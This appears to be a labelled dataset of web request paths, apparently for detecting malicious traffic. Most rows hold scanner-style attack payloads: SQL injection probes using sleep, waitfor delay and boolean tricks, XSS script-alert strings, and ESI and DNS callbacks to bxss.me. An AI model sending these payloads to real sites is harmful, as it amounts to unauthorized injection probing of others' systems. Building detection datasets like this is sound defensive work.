sentences	labels
xwdt/zjdt' and 2*3*8=6*8 and '0lgk'='0lgk/****/1.htm 	 1
xwzx/wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 	 1
aux/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 1
qhly/******/2021/05/07/javascript:window.close(); 	 1
lcgg/********/javascript:void(0); 	 1
ztzl/xxczh1%' and 2*3*8=6*8 and 'pjfr'!='pjfr%/****/11.htm 	 1
xxgk/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/****/1081/list.html 	 1
newscenter/******/2021/10/27/javascript:window.close(); 	 1
jsearchfront/http://*******/t/fit.txt?.jpg/jcse/website.js 	 1
qhly/******/2012/07/03/javascript:dozoom(9) 	 1
newscenter/******/2021/12/14/javascript:window.close(); 	 1
ywly/****/jcgc%' and 2*3*8=6*8 and 'usup'!='usup%/ 	 1
en/*******/messagefromchairman/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
hdjl/*******/202012/t20201225_2539623.html 	 1
wp-content/******/enfold/archive.php 	 1
ztzl/*****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
xwdt/****/czjs/gzdt/command/cmd 	 1
dcwj/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
ztpd/******/2021/12/18/javascript:void(0); 	 1
newscenter/******/2021/11/20/javascript:void(0); 	 1
wp-content/******/seowp/all-icons-page.php 	 1
was5/***/search?perpage=*/-->'""></iframe></script></style></title></textarea><script >alert(51550)</script> 	 1
index/****/flgw/""><script>alert(215)</script> 	 1
lz/******/2021/01/21/javascript:void(0); 	 1
jsearchfront/********/jcse/110105008056111/bxss.me/images/hanweb.css 	 1
lz/******/count/0006017/000000000000/window.location.href 	 1
ztpd/**********/ 	 1
xxgk/******/tjj/zfxxgkml_2127/hygq_2064/list'||'.html 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(6545)</script>?_=1630312392672 	 1
was5/***/search?perpage=20' waitfor delay '0:0:2&outlinepage=10&keyword=1&channelid=240998&searchword=1&page=10 	 1
xwzx/****/sgaj/201812/t20181208_'.gethostbyname(lc('hitis'.'inaqwueoff407.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(102).chr(75).chr(118).chr(74).'.html 	 1
en/**********/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> 	 1
system/resource%' and 2*3*8=6*8 and '0otc'!='0otc%/**/newcalendar/calendar.js 	 1
news/********/sichouzhiluwenda?page=1'"()&%<acu><script>9112(9131)</script> 	 1
public/******/js/core/window.location.href,title:document.title,container:s.selector,fragment:e.fragment,timeout:e.timeout},window.history.replacestate(a.state,document.title));var 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15' or 6637=6637 and '1'='1&outlinepage=10 	 1
fr/******/idangerous.swiper.css/*/-->'""></iframe></script></style></title></textarea><script >alert(28137)</script> 	 1
qhly/******/2012/03/23/javascript:dozoom(9) 	 1
jsearchfront/********/jcse/http://bxss.me/t/fit.txt/16/images/style.css 	 1
newscenter/******/2013/10/21/011213243_02.shtml 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(4980)">?_=1630312232645 	 1
images/***/phone.js/"><script>alert(7522)</script> 	 1
module/'""()&%<acx><script >gejm(9387)</script>/********/jquery.ad-gallery.js 	 1
qtyz/******/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 1
xwzx/"".gethostbyname(lc(""hitgl"".""dqpwcwph4428a.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(113).chr(80).chr(110).chr(83).""/****/201812/t20181208_112298.html 	 1
newscenter/******/2021/11/18/javascript:window.print() 	 1
module/**********/visit.jsp?i_columnid[0]=exp'and/**/extractvalue(1,concat(char(126),md5(1105662730)))and'&i_columnid[1]==1&i_webid=1&type=1 	 1
was5/***/search?page=2&channelid=-1) or 3552=8536#&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
investors-garden/******/intermediary/2020-07-15/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.html 	 1
socket.gethostbyname(""hithn"" ""iwcyplpfd267b.bxss.me."")[3].to_s) ""/***************/16/images/jquery.waterfall.js 	 1
swwj/******/2020/07/03/javascript:void(); 	 1
pic/*/00/59/50/595051_356657.jpg 	 1
lz/******/count/0006011/000000000000/window.location.href 	 1
wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 	 1
swld/******/2021/01/15/javascript:window.close(); 	 1
ldzc/*****/201610/t20161016_531.html?leader=薛香玲<esi:include src=""http://bxss.me/rpb.png""/> 	 1
socket.gethostbyname('hitqx' 'wcagrvvk4d467.bxss.me.')[3].to_s) '/****/7/12/art_35_234319.html 	 1
qhly/******/2021/12/20/javascript:dozoom(14) 	 1
qhly/******/2017/04/07/javascript:dozoom(12) 	 1
nbfw/********/loggedout.jsp?locale=""><script>alert(777)</script> 	 1
dcwj/****/admin/session_edit.php?page=resume_session.php" onmouseover=confirm(777)//&id=1 	 1
module/***/jpage/theme/simple'||'/css/jpage.css 	 1
zfld/******/2021/12/17/javascript:window.close(); 	 1
zwgk' and 2*3*8=6*8 and 'wppg'='wppg/****/bmjs/gdyx/ 	 1
e/******/viewclick/?addclick=1&classid=105&id=-1; waitfor delay '0:0:8.654' --  	 1
n42742/******/c1723818/content'||'.html 	 1
2021zt/******/2021/11/27/javascript:void(); 	 1
index/******/2019/09/20/javascript:void(0); 	 1
index/******/2021/04/04/javascript:void(); 	 1
vc/**/widgets/hanweb<esi:include src=""http://bxss.me/rpb.png""/>/ie6fixed/ie6fixed.js 	 1
index/******/2021/08/20/javascript:window.close(); 	 1
nbfw/cgi-bin/******/sharedobjmanager/policy_new/874/policytable?vdom="'/></script><script>alert(777)</script> 	 1
jsearchfront/********/jcse/110105008056111/16/images'||'/plugin/criteria/css.css 	 1
newscenter/******/2021/07/05/javascript:void(0); 	 1
zwgk/****/bmyjs/zzqzfzcbmyzstsjg/zzqscjgt/zzqgsj/\"javascript:void(0)\" 	 1
jsearchfront/**********/dimension.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=if(now()=sysdate(),sleep(15),0) 	 1
hdjl/****/202012/t20201225_2539623'""()&%<acx><script >cfsb(9973)</script>.html 	 1
zfld/******/2021/12/06/javascript:window.close(); 	 1
qtyz/****/gallery1.php?g_name=<script>alert(77729</script> 	 1
hdjl/****/202012/t20201225_2539623<esi:include src=""http://bxss.me/rpb.png""/>.html 	 1
swld/******/2021/12/17/javascript:window.print() 	 1
lcgg1/********/javascript:void(0); 	 1
zmhd/*****/hfswsj/zmhdyc'||'.html 	 1
was5/***/search?page=2&channelid=253477&searchword=1') and 7989=0840 and '1'='1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
xxgk'""()&%<acx><script >gva8(9864)</script>/*****/1088/1105/list.html 	 1
kjcx/****/gcdzyqzysjx/201501/t20150129_52362.html' and 'x'='y 	 1
xxgk/*****/1088/1105/list.html?new=0.4577770013510203<esi:include src=""http://bxss.me/rpb.png""/> 	 1
jsearchfront/********/jcse"" and 2*3*8=6*8 and ""u9rw""=""u9rw/110105008056111/16/images/hanweb.css 	 1
fxgg/********/javascript:void(0); 	 1
ywly/if(now()=sysdate(),sleep(15),0)/****/ 	 1
js/***/sa3/addholiday.do 	 1
xwzx/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(3429)</script>?_=1630311881123 	 1
